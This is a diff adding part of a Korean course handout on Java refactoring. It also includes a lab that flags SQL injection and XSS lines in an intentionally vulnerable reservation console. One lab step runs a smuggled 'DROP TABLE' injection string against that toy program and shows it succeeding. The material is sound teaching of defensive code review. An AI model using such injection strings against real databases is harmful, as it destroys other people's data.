+ReservationConsole.java    77  SQL 삽입      문자열을 이어 붙여 SQL 을 만듭니다     sql = "INSERT INTO reservation VALUES ('" +
+ReservationConsole.java    78  SQL 삽입      값을 따옴표 사이에 끼워 넣습니다        + "', '" + day + " " + time + "')";
+ReservationConsole.java    82  XSS         입력을 HTML 에 그대로 붙입니다       System.out.println("&lt;div&gt;" + msg + "&lt;/div&gt;")
+ReservationConsole.java    84  XSS         입력을 HTML 에 그대로 붙입니다       System.out.println("&lt;div class='sum'&gt;" + nam
+ReservationConsole.java    87  XSS         입력을 HTML 에 그대로 붙입니다       System.out.println("&lt;div class='err'&gt;" + msg
+--------------------------------------------------------------------------------------
+지적 5건</code></p>
+
+  <p>화면을 <code>화면\03_보안약점_before.png</code> 로 남기십시오.</p>
+
+  <h5>절차 4 — 지적된 줄마다 위험도를 따진다</h5>
+
+  <table class="wide">
+    <tr><th style="width:70px">줄</th><th style="width:150px">무엇이 들어가나</th><th>위험도와 까닭</th></tr>
+    <tr><td>77 · 78</td><td><code>member</code> · <code>facility</code> · <code>day</code> · <code>time</code></td>
+        <td>상 — 사용자가 친 값이 SQL 문장으로 들어갑니다</td></tr>
+    <tr><td>82</td><td><code>msg</code></td>
+        <td>중 — 우리가 만든 문장이지만 <code>name</code> 이 섞여 있습니다</td></tr>
+    <tr><td>84</td><td><code>name</code> · <code>member</code></td>
+        <td>상 — <code>member</code> 가 그대로 들어갑니다</td></tr>
+    <tr><td>87</td><td><code>LASTERROR</code></td>
+        <td>하 — 우리가 적은 문장만 들어갑니다</td></tr>
+  </table>
+
+  <p>같은 XSS 라도 무엇이 들어가느냐에 따라 위험도가 다릅니다.
+     사용자가 친 값이 그대로 들어가는 줄이 가장 위험합니다.</p>
+
+  <h5>절차 5 — 사용자 입력이 나가는 줄을 따로 센다</h5>
+
+  <p class="cmdline"><code>&gt; powershell -c "Select-String before\src\ReservationConsole.java -Pattern 'member' -SimpleMatch | Select-String 'println'"
+
+before\src\ReservationConsole.java:83:            System.out.println("&lt;div&gt;신청자 : " + member + "&lt;/div&gt;");
+before\src\ReservationConsole.java:84:            System.out.println("&lt;div class='sum'&gt;" + name + " / " + day + " / " + time + " / " + member + " / 누적 " + count + "건&lt;/div&gt;");</code></p>
+
+  <p>두 줄이 나왔습니다. 그런데 도구가 낸 목록에는 84번만 있고 83번이 없습니다.</p>
+
+  <div class="warn">83번이 목록에서 빠진 까닭을 정규식에서 찾아보십시오.
+    <code>"&lt;[a-z]+[^"]*&gt;"</code> 는 문자열이 꺾쇠로 끝나야 걸리는데,
+    83번의 문자열은 <code>"&lt;div&gt;신청자 : "</code> 라서 안내 글귀로 끝납니다.
+    84번은 <code>"&lt;div class='sum'&gt;"</code> 라 꺾쇠로 끝나서 걸렸습니다.
+    <b>못 찾은 것은 화면에 안 나오므로 없는 것처럼 보입니다.</b>
+  </div>
+
+  <h5>절차 6 — 규칙을 고쳐 볼지 정한다</h5>
+
+  <p class="cmdline"><code>고치는 길
+  "&lt;" 가 들어간 문자열 뒤에 + 가 붙으면 다 잡는다
+  → 83번이 잡힙니다
+  → 그 대신 "&lt;- " 같은 화살표를 찍는 줄도 잡힙니다
+
+고치지 않는 길
+  목록을 만든 다음에 사용자 입력이 나가는 줄을 따로 훑는다
+  → 사람이 한 번 더 봅니다</code></p>
+
+  <p>어느 쪽이든 괜찮습니다. 다만 고르고 나서 그 까닭을 적어 두어야 다음 사람이 헷갈리지 않습니다.
+     이 교안은 두 번째 길을 고르고, 실습 15 에서 남은 오탐을 설명하는 쪽으로 갑니다.</p>
+
+  <h5>절차 7 — 공격이 실제로 통하는지 본다</h5>
+
+  <p class="cmdline"><code>&gt; java -Dstdout.encoding=utf-8 -cp before\classes ReservationConsole
+...
+[SQL] INSERT INTO reservation VALUES ('M0005'; DROP TABLE reservation; --', 'F01', '2026-10-03 11:00')
+&lt;div&gt;예약되었습니다 : 체육관 A 2026-10-03 11:00&lt;/div&gt;
+&lt;div&gt;신청자 : M0005'; DROP TABLE reservation; --&lt;/div&gt;</code></p>
+
+  <p>첫 줄에서 작은따옴표가 닫히고 뒤에 새 명령이 붙었습니다.
+     셋째 줄에는 같은 글자가 화면 쪽으로 나갑니다.
+     프로그램은 오류를 하나도 안 내고, 마지막에 「처리 건수 : 3」을 찍습니다.</p>
+
+  <h5>절차 8 — 결과서를 쓴다</h5>
+
+  <p class="cmdline"><code>분석\보안약점.md
+
+| 줄 | 약점 | 도구가 찾았나 | 무엇이 들어가나 | 위험도 | 고칠 실습 |
+|-----|------|---------------|-----------------|--------|-----------|
+| 77 | SQL 삽입 | 예 | member 등 넷 | 상 | 12 |
+| 78 | SQL 삽입 | 예 | day · time | 상 | 12 |
+| 82 | XSS | 예 | msg | 중 | 13 |
+| 83 | XSS | 아니오 | member | 상 | 13 |
+| 84 | XSS | 예 | member · name | 상 | 13 |
+| 87 | XSS | 예 | lastError | 하 | 13 |</code></p>
+
+  <p>여섯 줄 가운데 한 줄이 「아니오」입니다. 이 한 줄이 이 실습에서 가장 값나가는 결과입니다.</p>
+
+  <h5>안 될 때 볼 곳</h5>
+
+  <table class="wide">
+    <tr><th style="width:330px">이런 일이 생기면</th><th>볼 곳</th></tr>
+    <tr><td>지적이 5건보다 많다</td>
+        <td><code>break</code> 를 넣어 한 줄에 한 번만 세는지 보십시오</td></tr>
+    <tr><td>83번이 잡힌다</td>
+        <td>정규식을 다르게 쓴 것입니다. 그것도 답입니다</td></tr>
+    <tr><td>정규식이 어렵다</td>
+        <td>한 규칙씩 따로 돌려 보면서 붙이십시오</td></tr>
+    <tr><td>내 코드에 SQL 이 없다</td>
+        <td>XSS 규칙만으로 해도 됩니다</td></tr>
+    <tr><td>공격 문자열을 바꿔 보고 싶다</td>
+        <td>바꿔 보십시오. 어떤 글자가 통하는지 알게 됩니다</td></tr>
+  </table>
+
+  <p><b>제출물</b> — <code>보안약점.py</code>, 화면 <code>03_보안약점_before.png</code>,
+     위험도 표, 입력이 나가는 줄을 센 화면, 규칙을 고칠지 정한 기록,
+     공격이 통하는 실행 화면, <code>보안약점.md</code></p>
+
+  <p><b>스스로 확인</b> —
+     ① 지적 5건이 나왔습니까
+     ② 줄마다 무엇이 들어가는지 적었습니까
+     ③ 도구가 못 찾은 줄을 찾아냈습니까
+     ④ 결과서에 「도구가 찾았나」 칸을 두었습니까</p>
+</div>
+      </div>
+</div>
+<h3 class="lv">레벨 4 · 적용 <span>능력단위요소 ③ · 한 번에 한 가지씩 고칩니다</span></h3>
+
+<div class="step" id="st9">
+      <h3><i>9</i>메서드 추출</h3>
+      <aside class="side">
+        <p class="pt">한 덩어리를 떼어 이름을 붙입니다.</p>
+        <b class="sh">근거</b>
+        <p class="v">학습모듈 3-1</p>
+        <b class="sh">용어</b>
+        <p class="v">메서드 추출 · Extract Method</p>
+      </aside>
+      <div class="bd">
+
+<h4>떼어 낼 덩어리를 고릅니다</h4>
+
+<p class="cmdline"><code>process() 안에서 주석을 붙이고 싶어지는 자리를 찾습니다
+
+  // 시설을 찾는다        ← 여덟 줄
+  // 날짜를 검사한다       ← 다섯 줄
+  // 정원을 확인한다       ← 아홉 줄
+  // SQL 을 만든다        ← 두 줄
+  // 화면에 찍는다         ← 다섯 줄</code></p>
+
+<p>주석으로 설명하고 싶은 덩어리가 곧 떼어 낼 메서드입니다.
+   주석 대신 메서드 이름을 붙이면 주석이 필요 없어집니다.</p>
+
+<h4>하나를 떼어 봅니다</h4>
+
+<p class="cmdline"><code>떼기 전
+  boolean found = false;
+  for (int i = 0; i &lt; data.size(); i++) {
+      if (data.get(i)[0].equals(facility)) {
+          found = true;
+          name = data.get(i)[1];
+          cap = Integer.parseInt(data.get(i)[2]);
+      }
+  }
+  if (!found) { LASTERROR = "없는 시설입니다 : " + facility; ok = false; }
+
+떼고 나서
+  String[] row = findFacility(facility);
+  if (row == null) {
+      lastError = "없는 시설입니다 : " + facility;
+      ok = false;
+  } else {
+      name = row[1];
+      cap = Integer.parseInt(row[2]);
+  }</code></p>
+
+<h4>이름이 설명을 대신합니다</h4>
+
+<table class="wide">
+  <tr><th style="width:190px">떼어 낸 메서드</th><th>무엇을 하는지</th></tr>
+  <tr><td><code>findFacility</code></td><td>시설 번호로 자료를 찾습니다. 없으면 <code>null</code></td></tr>
+  <tr><td><code>isMonthValid</code></td><td>날짜의 달이 1~12 인지 봅니다</td></tr>
+  <tr><td><code>usedOn</code></td><td>그날 몇 건이 잡혀 있는지 셉니다</td></tr>
+  <tr><td><code>buildSql</code></td><td>저장할 문장을 만듭니다</td></tr>
+  <tr><td><code>printAccepted</code></td><td>받아들인 예약을 화면에 찍습니다</td></tr>
+  <tr><td><code>printError</code></td><td>까닭을 화면에 찍습니다</td></tr>
+</table>
+
+<h4>돌려 보고 숫자를 봅니다</h4>
+
+<p class="cmdline"><code>&gt; python 복잡도.py step1a\src
+ReservationConsole.java   process            44      13
+ReservationConsole.java   findFacility        8       3
+ReservationConsole.java   isMonthValid        4       2
+ReservationConsole.java   usedOn              9       4
+...
+메서드 11개 · 가장 긴 것 44줄 · 최대 복잡도 13
+
+&gt; python 회귀테스트.py before\classes step1a\classes
+줄 15개 · 다른 줄 0개
+■ 기능이 그대로입니다</code></p>
+
+<p>process 가 64줄에서 44줄로, 복잡도가 19 에서 13 으로 내려왔습니다.
+   목표로 잡은 10 에는 아직 못 미칩니다.</p>
+
+<div class="note">덩어리를 떼어 내도 분기는 사라지지 않습니다.
+  <code>if (ok)</code> 다섯 개가 그대로 남아 있어서 복잡도가 13 에서 멈춥니다.
+  떼어 내는 일은 읽기 좋게 만드는 일이고, 분기를 줄이는 일은 실습 11 에서 따로 합니다.
+  한 가지 기법으로 모든 문제가 풀리지는 않습니다.
+</div>
+
+<h4>죽은 코드를 같이 지웁니다</h4>
+
+<p class="cmdline"><code>지운 것
+  Format_Name()     아무도 안 부릅니다
+  unused()          아무도 안 부릅니다
+  max               어디에도 안 쓰입니다
+
+고친 이름
+  data       → facilities
+  count      → acceptedCount
+  LASTERROR  → lastError</code></p>
+
+<p>실습 6 에서 적어 둔 표준 위반 다섯 건 가운데 넷이 여기서 사라집니다.</p>
+
+<h4>남은 한 건을 봅니다</h4>
+
+<p class="cmdline"><code>&gt; python 표준검사.py step1a\src
+ReservationConsole.java     7  상수명     facilities    대문자와 밑줄
+지적 1건</code></p>
+
+<p>새로 지은 <code>facilities</code> 가 걸렸습니다.
+   <code>static final</code> 로 선언했으니 상수 표기를 쓰라는 지적인데,
+   담긴 목록의 내용은 계속 바뀌므로 상수라 부르기 어려운 자리이기도 합니다.
+   팀이 어느 쪽으로 정하든 상관없고, 정한 대로 도구의 규칙을 맞추면 됩니다.</p>
+      <div class="lab">
+  <b class="t">실습 9</b>
+  <b>메서드를 떼어 내 step1a 를 만든다</b>
+
+  <p><b>목적</b> — process 에서 덩어리를 떼어 내고 죽은 코드를 지웁니다.
+     떼어 낼 때마다 컴파일하고 돌려서 화면이 그대로인지 보십시오.
+     한 번에 다 떼고 나서 확인하면 어디서 틀어졌는지 못 찾습니다.</p>
+
+  <h5>절차 1 — 옮겨 놓고 시작한다</h5>
+
+  <p class="cmdline"><code>&gt; copy before\src\ReservationConsole.java step1a\src\
+&gt; javac -encoding utf-8 -proc:none -d step1a\classes step1a\src\ReservationConsole.java
+&gt; java -Dstdout.encoding=utf-8 -cp step1a\classes ReservationConsole &gt; step1a\출력.txt
+&gt; powershell -c "Compare-Object (Get-Content before\출력.txt) (Get-Content step1a\출력.txt)"
+(아무것도 안 나옵니다)</code></p>
+
+  <p>고치기 전에 같은지부터 확인합니다.
+     <code>Compare-Object</code> 는 다른 줄이 있을 때만 찍으므로 아무것도 안 나오면 같은 것입니다.
+     복사가 잘못되었다면 여기서 드러납니다.</p>
+
+  <h5>절차 2 — 죽은 코드부터 지운다</h5>
+
+  <p class="cmdline"><code>지우는 것
+  private static final int max = 20;
+  private static String Format_Name(String s) { ... }
+  static int unused(int a, int b) { ... }
+
+&gt; javac -encoding utf-8 -proc:none -d step1a\classes step1a\src\ReservationConsole.java
+&gt; java -Dstdout.encoding=utf-8 -cp step1a\classes ReservationConsole &gt; step1a\출력.txt
+&gt; powershell -c "Compare-Object (Get-Content before\출력.txt) (Get-Content step1a\출력.txt)"
+(아무것도 안 나옵니다)</code></p>
+
+  <p>가장 안전한 고치기부터 합니다. 아무도 안 부르는 것을 지우는 일이라 깨질 자리가 없습니다.</p>
+
+  <h5>절차 3 — 이름을 바꾼다</h5>
+
+  <p class="cmdline"><code>data       → facilities
+count      → acceptedCount
+LASTERROR  → lastError
+
+편집기의 «모두 바꾸기» 를 쓰되 한 이름씩 바꾸고 그때마다 컴파일하십시오</code></p>
+
+  <p>세 이름을 한꺼번에 바꾸면 하나가 틀렸을 때 어느 것인지 모릅니다.
+     자바는 이름이 틀리면 컴파일이 안 되므로, 한 번에 하나씩 바꾸면 곧바로 알 수 있습니다.</p>
+
+  <h5>절차 4 — 시설을 찾는 덩어리를 뗀다</h5>
+
+  <p class="cmdline"><code>떼어 낼 자리 — process 안의 열네 줄
+
+    boolean found = false;
+    for (int i = 0; i &lt; facilities.size(); i++) {
+        if (facilities.get(i)[0].equals(facility)) {
+            found = true;
+            name = facilities.get(i)[1];
+            cap = Integer.parseInt(facilities.get(i)[2]);
+        }
+    }
+    if (!found) { lastError = "없는 시설입니다 : " + facility; ok = false; }
+
+떼어 낸 메서드
+
+    private static String[] findFacility(String facility) {
+        for (String[] r : facilities) {
+            if (r[0].equals(facility)) {
+                return r;
+            }
+        }
+        return null;
+    }
+
+부르는 자리
+
+    String[] row = findFacility(facility);
+    if (row == null) {
+        lastError = "없는 시설입니다 : " + facility;
+        ok = false;
+    } else {
+        name = row[1];
+        cap = Integer.parseInt(row[2]);
+    }</code></p>
+
+  <div class="note">떼어 내면서 반복문 꼴도 바뀌었습니다.
+    인덱스를 세는 <code>for</code> 가 향상된 <code>for</code> 로 바뀌었고, <code>found</code> 깃발이 사라졌습니다.
+    찾으면 바로 돌려주면 되므로 「찾았는지」를 따로 기억할 필요가 없어진 것입니다.
+    떼어 내는 일만 해도 이렇게 곁가지가 같이 정리되는 경우가 많습니다.
+  </div>
+
+  <h5>절차 5 — 나머지 여섯을 뗀다</h5>
+
+  <p class="cmdline"><code>isMonthValid    날짜의 달을 검사합니다
+usedOn          그날 몇 건인지 셉니다
+buildSql        저장할 문장을 만듭니다
+printSql        SQL 을 찍습니다
+printAccepted   받아들인 결과를 찍습니다
+printError      까닭을 찍습니다
+
+하나 뗄 때마다 컴파일하고 Compare-Object 로 견줍니다</code></p>
+
+  <h5>절차 6 — 돌려서 숫자를 본다</h5>
+
+  <p class="cmdline"><code>&gt; python 복잡도.py step1a\src
+파일                        메서드                 줄     복잡도
+----------------------------------------------------------
+ReservationConsole.java   main                9       1
+ReservationConsole.java   seed                4       1
+ReservationConsole.java   process            44      13
+ReservationConsole.java   findFacility        8       3
+ReservationConsole.java   isMonthValid        4       2
+ReservationConsole.java   usedOn              9       4
+ReservationConsole.java   buildSql            4       1
+ReservationConsole.java   printSql            3       1
+ReservationConsole.java   printAccepted       6       1
+ReservationConsole.java   printError          3       1
+ReservationConsole.java   report              3       1
+----------------------------------------------------------
+메서드 11개 · 가장 긴 것 44줄 · 최대 복잡도 13</code></p>
+
+  <p>메서드가 여섯에서 열하나로 늘고 process 가 64줄에서 44줄로 줄었습니다.
+     복잡도는 19 에서 13 입니다. 목표 10 에는 아직 못 미칩니다.</p>
+
+  <h5>절차 7 — 왜 13 에서 멈추는지 본다</h5>
+
+  <p class="cmdline"><code>&gt; powershell -c "(Select-String step1a\src\ReservationConsole.java -Pattern 'if (ok) {' -SimpleMatch).Count"
+5</code></p>
+
+  <p>덩어리를 떼어 냈어도 <code>if (ok)</code> 다섯은 그대로입니다.
+     분기를 다른 메서드로 옮긴 것이 아니라 분기 안쪽의 일을 옮긴 것이라 그렇습니다.
+     이 다섯은 실습 11 에서 없앱니다.</p>
+
+  <h5>절차 8 — 도구를 다시 돌린다</h5>
+
+  <p class="cmdline"><code>&gt; python 표준검사.py step1a\src
+ReservationConsole.java     7  상수명     facilities    대문자와 밑줄
+지적 1건
+
+&gt; python 죽은코드.py step1a\src
+ReservationConsole.java    97  닿을 수 없는 줄   + "', '" + day + " " + time
+지적 1건</code></p>
+
+  <p>표준 지적이 다섯에서 하나로 줄었는데 그 하나는 새로 생긴 것입니다.
+     죽은 코드 지적은 셋에서 하나로 줄었고 그 하나는 오탐입니다.
+     <code>buildSql</code> 의 <code>return</code> 이 두 줄에 걸쳐 있어서 둘째 줄을 오해했습니다.</p>
+
+  <h5>절차 9 — 파일 크기를 견준다</h5>
+
+  <p class="cmdline"><code>&gt; powershell -c "(Get-Content before\src\ReservationConsole.java).Count"
+103
+&gt; powershell -c "(Get-Content step1a\src\ReservationConsole.java).Count"
+118</code></p>
+
+  <p>죽은 코드를 열 줄 넘게 지웠는데 전체는 오히려 열다섯 줄 늘었습니다.
+     메서드로 떼어 내면 선언 줄과 닫는 중괄호가 메서드마다 붙기 때문입니다.</p>
+
+  <h5>안 될 때 볼 곳</h5>
+
+  <table class="wide">
+    <tr><th style="width:330px">이런 일이 생기면</th><th>볼 곳</th></tr>
+    <tr><td>견줘서 차이가 나온다</td>
+        <td>방금 뗀 것만 되돌리십시오. 여러 개를 한꺼번에 뗀 것입니다</td></tr>
+    <tr><td><code>name</code> 이나 <code>cap</code> 이 안 넘어간다</td>
+        <td>돌려주는 값으로 받으십시오. 배열 하나를 돌려주면 둘 다 꺼낼 수 있습니다</td></tr>
+    <tr><td>복잡도가 안 줄어든다</td>
+        <td>정상입니다. 절차 7 을 보십시오</td></tr>
+    <tr><td>줄 수가 늘어서 잘못한 것 같다</td>
+        <td>늘어나는 것이 맞습니다. 재는 것은 복잡도입니다</td></tr>
+    <tr><td>한글이 깨져서 못 견주겠다</td>
+        <td>출력 파일을 만들 때 <code>-Dstdout.encoding=utf-8</code> 을 넣었는지 보십시오</td></tr>
+  </table>
+
+  <p><b>제출물</b> — <code>step1a\src</code>, 단계마다 견준 화면,
+     복잡도 화면, <code>if (ok)</code> 를 센 화면,
+     표준검사와 죽은코드 화면, 줄 수 비교</p>
+
+  <p><b>스스로 확인</b> —
+     ① 하나 뗄 때마다 컴파일하고 견줬습니까
+     ② 메서드가 열하나가 되었습니까
+     ③ 복잡도가 13 에서 멈추는 까닭을 확인했습니까
+     ④ 줄 수가 늘어난 것을 확인했습니까</p>
+</div>
+      </div>
+</div>
+
+<div class="step" id="st10">
+      <h3><i>10</i>메서드 이동</h3>
+      <aside class="side">
+        <p class="pt">자료를 가진 쪽으로 옮깁니다.</p>
+        <b class="sh">근거</b>
+        <p class="v">학습모듈 3-1</p>
+        <b class="sh">용어</b>
+        <p class="v">메서드 이동 · Move Method</p>
+      </aside>
+      <div class="bd">
+
+<h4>어디로 옮길지 고릅니다</h4>
+
+<p class="cmdline"><code>findFacility  facilities 를 훑습니다
+usedOn        facilities 를 훑습니다
+seed          facilities 에 넣습니다
+
+셋 다 같은 자료를 만집니다
+그 자료를 가진 클래스를 새로 만들어 셋을 옮깁니다</code></p>
+
+<h4>클래스를 만듭니다</h4>
+
+<p class="cmdline"><code>public class FacilityRepository {
+
+    private final List&lt;String[]&gt; rows = new ArrayList&lt;&gt;();
+
+    public void seed() { ... }
+
+    public String[] find(String facility) { ... }
+
+    public int usedOn(String day) { ... }
+}</code></p>
+
+<p>부르는 쪽은 이렇게 바뀝니다.</p>
+
+<p class="cmdline"><code>앞    String[] row = findFacility(facility);
+뒤    String[] row = FACILITIES.find(facility);
+
+앞    if (usedOn(day) &gt;= cap)
+뒤    if (FACILITIES.usedOn(day) &gt;= cap)</code></p>
+
+<h4>돌려 보고 숫자를 봅니다</h4>
+
+<p class="cmdline"><code>&gt; python 복잡도.py step1b\src
+메서드 11개 · 가장 긴 것 44줄 · 최대 복잡도 13
+
+&gt; python 회귀테스트.py before\classes step1b\classes
+줄 15개 · 다른 줄 0개
+■ 기능이 그대로입니다</code></p>
+
+<div class="warn">앞 실습의 숫자와 한 글자도 다르지 않습니다.
+  메서드 11개, 가장 긴 것 44줄, 최대 복잡도 13. 파일만 하나에서 둘로 늘었습니다.
+  메서드 이동은 코드가 얼마나 얽혔는지를 재는 숫자를 바꾸지 않습니다.
+  바뀌는 것은 <b>어느 클래스가 그 자료의 주인인가</b>이고, 그것을 재는 도구는 우리에게 없습니다.
+</div>
+
+<h4>그런데도 옮기는 까닭</h4>
+
+<table class="wide">
+  <tr><th style="width:190px">옮기고 나면</th><th></th></tr>
+  <tr><td>자료를 만지는 곳이 하나</td><td>목록 구조를 바꿀 때 한 파일만 봅니다</td></tr>
+  <tr><td>Console 이 가벼워짐</td><td>화면에 찍는 일만 남습니다</td></tr>
+  <tr><td>시험하기 쉬움</td><td>화면 없이 저장소만 따로 시험할 수 있습니다</td></tr>
+  <tr><td>바꿔 끼우기 쉬움</td><td>메모리 목록을 데이터베이스로 갈아 끼울 수 있습니다</td></tr>
+</table>
+
+<p>넷 다 숫자로는 안 잡히고 나중에 값을 합니다.
+   앞 교과 소프트웨어공학 활용에서 한 지표만으로 품질을 판정하면 안 된다고 한 것이 여기서 다시 걸립니다.</p>
+
+<h4>이름도 같이 손봅니다</h4>
+
+<p class="cmdline"><code>findFacility  →  FacilityRepository.find
+usedOn        →  FacilityRepository.usedOn
+
+클래스 이름이 앞에 붙으므로 메서드 이름에서 «Facility» 를 뺍니다
+FACILITIES.findFacility() 는 같은 말을 두 번 합니다</code></p>
+
+<p>옮긴 뒤에 표준검사를 다시 돌리면 지적이 0건이 됩니다. <code>facilities</code> 를 <code>FACILITIES</code> 로 고쳤기 때문입니다.</p>
+      <div class="lab">
+  <b class="t">실습 10</b>
+  <b>시설 자료를 다루는 일을 옮겨 step1b 를 만든다</b>
+
+  <p><b>목적</b> — 같은 자료를 만지는 메서드를 그 자료를 가진 클래스로 모읍니다.
+     숫자는 하나도 안 움직이는데 왜 옮기는지를 직접 재 보고 판단하십시오.</p>
+
+  <h5>절차 1 — 옮길 것을 고른다</h5>
+
+  <p class="cmdline"><code>&gt; powershell -c "Select-String step1a\src\ReservationConsole.java -Pattern 'facilities' -SimpleMatch"
+
+step1a\src\ReservationConsole.java:7:    private static final List&lt;String[]&gt; facilities = ...
+step1a\src\ReservationConsole.java:22:        facilities.add(new String[]{"F01", "체육관 A", "20"});
+step1a\src\ReservationConsole.java:23:        facilities.add(new String[]{"F02", "체육관 B", "30"});
+step1a\src\ReservationConsole.java:72:        for (String[] r : facilities) {
+step1a\src\ReservationConsole.java:87:        for (String[] r : facilities) {</code></p>
+
+  <p><code>facilities</code> 를 만지는 자리가 다섯인데 전부 세 메서드 안에 있습니다.
+     <code>seed</code> 와 <code>findFacility</code> 와 <code>usedOn</code> 입니다.</p>
+
+  <h5>절차 2 — 클래스를 만든다</h5>
+
+  <p class="cmdline"><code>step1b\src\FacilityRepository.java
+
+import java.util.ArrayList;
+import java.util.List;
+
+/** 시설 자료를 담고 찾아 준다. */
+public class FacilityRepository {
+
+    private final List&lt;String[]&gt; rows = new ArrayList&lt;&gt;();
+
+    public void seed() {
+        rows.add(new String[]{"F01", "체육관 A", "20"});
+        rows.add(new String[]{"F02", "체육관 B", "30"});
+    }
+
+    public String[] find(String facility) {
+        for (String[] r : rows) {
+            if (r[0].equals(facility)) {
+                return r;
+            }
+        }
+        return null;
+    }
+
+    public int usedOn(String day) {
+        int used = 0;
+        for (String[] r : rows) {
+            if (r.length &gt; 3 &amp;&amp; r[3].equals(day)) {
+                used++;
+            }
+        }
+        return used;
+    }
+}</code></p>
+
+  <p>목록 이름을 <code>facilities</code> 에서 <code>rows</code> 로 바꿨습니다.
+     클래스 이름이 이미 시설이라고 말하고 있으므로 필드까지 같은 말을 할 필요가 없습니다.</p>
+
+  <h5>절차 3 — 부르는 쪽을 고친다</h5>
+
+  <p class="cmdline"><code>Console 에 남기는 것
+
+    private static final FacilityRepository FACILITIES = new FacilityRepository();
+
+바뀌는 자리
+
+    seed();                        →  FACILITIES.seed();
+    findFacility(facility)         →  FACILITIES.find(facility)
+    usedOn(day)                    →  FACILITIES.usedOn(day)</code></p>
+
+  <h5>절차 4 — 컴파일하고 견준다</h5>
+
+  <p class="cmdline"><code>&gt; javac -encoding utf-8 -proc:none -d step1b\classes step1b\src\*.java
+&gt; java -Dstdout.encoding=utf-8 -cp step1b\classes ReservationConsole &gt; step1b\출력.txt
+&gt; powershell -c "Compare-Object (Get-Content before\출력.txt) (Get-Content step1b\출력.txt)"
+(아무것도 안 나옵니다)</code></p>
+
+  <p>파일이 둘이 되었으므로 컴파일할 때 <code>*.java</code> 로 한꺼번에 넘깁니다.</p>
+
+  <h5>절차 5 — 숫자를 본다</h5>
+
+  <p class="cmdline"><code>&gt; python 복잡도.py step1b\src
+...
+메서드 11개 · 가장 긴 것 44줄 · 최대 복잡도 13</code></p>
+
+  <div class="warn">실습 9 의 마지막 줄과 한 글자도 다르지 않습니다.
+    메서드를 다른 클래스로 통째로 옮겼는데 세 숫자가 그대로입니다.
+    옮긴다고 분기가 없어지지 않고 메서드가 늘거나 줄지도 않으니 당연한 결과입니다.
+    <b>메서드 이동의 성과는 우리 도구로 잴 수 없습니다.</b>
+  </div>
+
+  <h5>절차 6 — 그러면 무엇이 달라졌는지 세어 본다</h5>
+
+  <p class="cmdline"><code>&gt; powershell -c "(Select-String step1a\src\ReservationConsole.java -Pattern 'facilities' -SimpleMatch).Count"
+5
+&gt; powershell -c "(Select-String step1b\src\ReservationConsole.java -Pattern 'FACILITIES' -SimpleMatch).Count"
+4
+&gt; powershell -c "(Select-String step1b\src\FacilityRepository.java -Pattern 'rows' -SimpleMatch).Count"
+5</code></p>
+
+  <p>자료를 직접 만지는 다섯 자리가 전부 한 파일 안으로 들어갔습니다.
+     Console 에 남은 넷은 자료를 만지는 것이 아니라 저장소에 부탁하는 것입니다.
+     목록을 배열에서 다른 구조로 바꾸려면 이제 <code>FacilityRepository.java</code> 한 파일만 열면 됩니다.</p>
+
+  <h5>절차 7 — 이름에서 겹치는 말을 뺀다</h5>
+
+  <p class="cmdline"><code>findFacility  →  find
+usedOn        →  usedOn  (그대로)
+
+FACILITIES.findFacility(facility) 는 시설을 두 번 말합니다
+FACILITIES.find(facility) 로 충분합니다</code></p>
+
+  <h5>절차 8 — 표준 지적을 닫는다</h5>
+
+  <p class="cmdline"><code>&gt; python 표준검사.py step1b\src
+--------------------------------------------------------------------------
+지적 0건</code></p>
+
+  <p>실습 9 에서 남았던 <code>facilities</code> 지적이 사라졌습니다.
+     클래스로 옮기면서 Console 쪽 상수를 <code>FACILITIES</code> 로 지었기 때문입니다.
+     표준 검사가 처음으로 0건이 되는 자리입니다.</p>
+
+  <h5>절차 9 — 옮겨서 얻은 것을 적는다</h5>
+
+  <p class="cmdline"><code>분석\메서드이동.md
+
+| 얻은 것 | 숫자로 재나 | 언제 값을 하나 |
+|---------|-------------|----------------|
+| 자료를 만지는 곳이 한 파일 | 아니오 | 저장 구조를 바꿀 때 |
+| Console 이 화면 일만 함 | 아니오 | 다음 사람이 읽을 때 |
+| 저장소만 따로 시험 가능 | 아니오 | 단위 시험을 짤 때 |
+| 목록을 DB 로 갈아 끼우기 | 아니오 | SQL 응용 교과에서 |
+
+네 줄 다 «아니오» 입니다</code></p>
+
+  <p>숫자로 안 잡히는 성과를 적어 두는 것이 이 실습의 제출물입니다.
+     앞 교과 소프트웨어공학 활용에서 한 지표로 품질을 판정하면 안 된다고 했는데,
+     여기서는 아예 지표가 없는 성과를 다룹니다.</p>
+
+  <h5>안 될 때 볼 곳</h5>
+
+  <table class="wide">
+    <tr><th style="width:330px">이런 일이 생기면</th><th>볼 곳</th></tr>
+    <tr><td><code>cannot find symbol</code></td>
+        <td>같은 폴더의 <code>*.java</code> 를 함께 컴파일해야 합니다</td></tr>
+    <tr><td><code>static</code> 에서 못 부른다고 나온다</td>
+        <td>저장소를 <code>static</code> 필드로 두었는지 보십시오</td></tr>
+    <tr><td>숫자가 안 바뀌어서 잘못한 것 같다</td>
+        <td>안 바뀌는 것이 정답입니다</td></tr>
+    <tr><td>클래스를 어디까지 나누나</td>
+        <td>같은 자료를 만지는 것끼리 묶으면 됩니다</td></tr>
+  </table>
+
+  <p><b>제출물</b> — <code>facilities</code> 를 훑은 화면,
+     <code>FacilityRepository.java</code>, 견준 화면,
+     복잡도 화면(실습 9 와 같음), 자리를 센 화면,
+     표준검사 0건 화면, <code>메서드이동.md</code></p>
+
+  <p><b>스스로 확인</b> —
+     ① 같은 자료를 만지는 메서드를 모았습니까
+     ② 견줘서 차이가 없는 것을 봤습니까
+     ③ 숫자가 안 바뀐 것을 확인했습니까
+     ④ 숫자로 안 잡히는 성과를 적었습니까</p>
+</div>
+      </div>
+</div>
+
+<div class="step" id="st11">
+      <h3><i>11</i>임시 변수 정리</h3>
+      <aside class="side">
+        <p class="pt">깃발을 없애면 분기가 준다.</p>
+        <b class="sh">근거</b>
+        <p class="v">학습모듈 3-1</p>
+        <b class="sh">용어</b>
+        <p class="v">임시 변수 · 이른 반환</p>
+      </aside>
+      <div class="bd">
+
+<h4>임시 변수가 다섯입니다</h4>
+
+<p class="cmdline"><code>String sql = "";
+String msg = "";
+boolean ok = true;
+int cap = 0;
+String name = null;</code></p>
+
+<p>다섯 가운데 <code>ok</code> 하나가 흐름을 붙잡고 있습니다.
+   검사 하나가 끝날 때마다 <code>ok</code> 를 내려 두고, 다음 검사는 <code>if (ok)</code> 로 감쌉니다.</p>
+
+<h4>깃발을 이른 반환으로 바꿉니다</h4>
+
+<p class="cmdline"><code>앞
+  boolean ok = true;
+  if (member == null ...) { lastError = "..."; ok = false; }
